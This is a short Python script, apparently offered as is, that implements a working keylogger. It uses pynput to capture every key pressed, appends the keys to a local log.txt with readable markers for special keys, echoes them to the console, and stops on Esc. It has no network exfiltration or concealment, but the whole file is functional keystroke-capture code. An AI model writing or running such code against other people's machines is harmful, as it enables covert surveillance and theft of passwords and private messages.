from pynput.keyboard import Key, Listener

def on_press(key):
    write_file(key)
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))


def write_file(key):
    with open('log.txt', 'a') as f:
        k = str(key).replace("'", "")
        if k == 'Key.space':
            f.write(' ')
        elif k == 'Key.enter':
            f.write('\n')
        elif k == 'Key.backspace':
            f.write('[BACKSPACE]')
        elif 'Key.' in k:
            f.write(f'[{k.replace("Key.", "").upper()}]')
        else:
            f.write(k)


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
